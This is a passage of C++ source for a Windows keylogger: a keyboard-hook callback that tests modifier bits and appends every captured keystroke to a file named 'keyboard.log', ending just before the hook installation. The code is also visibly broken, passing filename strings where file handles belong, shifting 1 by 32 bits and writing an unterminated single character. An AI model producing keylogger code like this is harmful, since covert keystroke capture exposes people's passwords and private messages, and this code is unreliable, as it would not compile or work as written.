        bool shift = (modifiers & (1 << 32)); // Shift
        bool ctrl = (modifiers & (1 << 17)); // Ctrl
        bool alt = (modifiers & (1 << 12)); // Alt
        // Append the key and modifiers to the buffer
        if (wParam >= 0 && wParam <= 0xFF) {
            if (shift || (wParam == 0x1C || wParam == 0x18 || wParam == 0x19)) {
                // Handle special keys with modifiers
                // For example, uppercase letters
                char key = wParam;
                if (fopen("keyboard.log", "a") == NULL) {
                    cout << "Failed to open log file" << endl;
                } else {
                    fputs(&key, "keyboard.log");
                    fclose("keyboard.log");
                }
            } else {
                // For other keys, append as is
                char key = wParam;
                if (fopen("keyboard.log", "a") == NULL) {
                    cout << "Failed to open log file" << endl;
                } else {
                    fputs(&key, "keyboard.log");
                    fclose("keyboard.log");
                }
            }
        }
    }
}

// Install the keyboard hook
